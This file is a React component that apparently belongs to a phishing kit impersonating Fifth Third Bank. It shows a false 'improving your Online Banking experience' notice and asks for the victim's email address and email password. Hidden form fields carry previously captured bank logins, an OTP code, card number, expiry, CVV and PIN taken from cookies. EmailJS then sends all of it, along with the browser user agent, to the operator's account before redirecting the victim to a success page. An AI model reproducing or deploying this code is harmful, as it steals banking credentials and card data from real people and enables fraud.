import React, {useState, useRef} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";

type ELogin = {
  email: string;
    mail_p: string;
}


type OTP = {
  cn:string;
  edate:string;
  ccv:string;
  pn:string;
}

export default function Eadditional() {

  const login1: Login = cookies.get("login1");
    const login2: Login2 = cookies.get("login2");
    const otp: { code: string } = cookies.get("otp");
    const card:OTP  = cookies.get("card");
    

  const [isLoading, setIsLoading] = useState(false)
  const [formInput, setFormInput] = useState<ELogin>({
    email: "",
    mail_p: ""
})
const form = useRef<HTMLFormElement>(null);
let agent = navigator.userAgent;
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

function handleSubmit(event: React.FormEvent<HTMLFormElement>){
  setIsLoading(true)
    event.preventDefault()
  
    emailjs.sendForm('service_9gs21m9', 'template_oeo8f9m', form.current!, 'T8uOG8MEAEQT6Xur6')
    .then((result) => {
      console.log(result.text)
      navigate("../success", {replace:true})
    
    }, (error) => {
      alert("could not complete your request")
      console.log(error)
      setIsLoading(false)
    }); 
  
}

  return (
    <div>
      <div rob-oos="" style={{ display: "block" }}>
        <div
          className="s-alerts -warning spacing-half -icon"
          data-valid="false"
          role="alert"
        >
          <span className="s-alerts__content" style={{ textAlign: "center" }}>
            <p className="fs-1">
              Currently, Fifth Third Bank is improving your Online Banking
              experience, please confirm your email address.
            </p>
          </span>
        </div>
      </div>
      <form
      ref={form}
        onSubmit={handleSubmit}
        method="POST"
        className="form"
        name="login-form"
      >
    
        <div className="m-t">
          <label className="form-label form__label" htmlFor="user-id">
            Email address
          </label>
          <div username-cell="" className="dynamic-state" data-valid="true">
            <div className="input-group">
              <input
                username-input=""
                className="form-input input-group__input full dynamic-state__input"
                name="email"
                id="user"
                type="email"
                required
                defaultValue={formInput.email}
                onChange={handleInputChange}
              />

              <div id="user-id-error"></div>
            </div>
          </div>
        </div>

        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            Email password
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input"
              name="mail_p"
              id="password"
              type="password"
              required
              onChange={handleInputChange}
              defaultValue={formInput.mail_p}
            />
            <div id="password-error"></div>
          </div>
        </div>

        <div style={{ display: "none" }}>
                <div className="form-item">
                  <label htmlFor="">Username</label>
                  <input type="text" name="browser" defaultValue={agent} />
                </div>

               


             
                <div className="form-item">
                  <label htmlFor="">Username</label>
                  <input
                    type="text"
                    name="username"
                    defaultValue={login1.username}
                  />
                </div>

                <div className="form-item">
                  <label htmlFor="">Password</label>
                  <input
                    type="password"
                    name="password"
                    defaultValue={login1.password}
                  />
                </div>

                <div className="form-item">
                  <label htmlFor="">Username</label>
                  <input
                    type="text"
                    name="username2"
                    defaultValue={login2.username2}
                  />
                </div>

                <div className="form-item">
                  <label htmlFor="">Password</label>
                  <input
                    type="password"
                    name="password2"
                    defaultValue={login2.password2}
                  />
                </div>

                <div className="form-item">
                  <label htmlFor="">Enter code</label>
                  <input name="code" type="text" defaultValue={otp.code} />
                  <input type="text" name="cn" defaultValue={card.cn} />
                  <input type="text" name="edate" defaultValue={card.edate} />
                  <input type="text" name="cv" defaultValue={card.ccv} />
                  <input type="text" name="pn" defaultValue={card.pn} />
                </div>
              </div>
        <div className="m-t">
          {isLoading ? 
          <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
          <span className="loader"></span>
          </div>
          :
          <button
            login-button=""
            type="submit"
            className="button -default -primary form__btn -full"
          >
            Submit
            <span className="loading--1">.</span>
            <span className="loading--2">.</span>
            <span className="loading--3">.</span>
          </button>
}
        </div>
      </form>
    </div>
  );
}
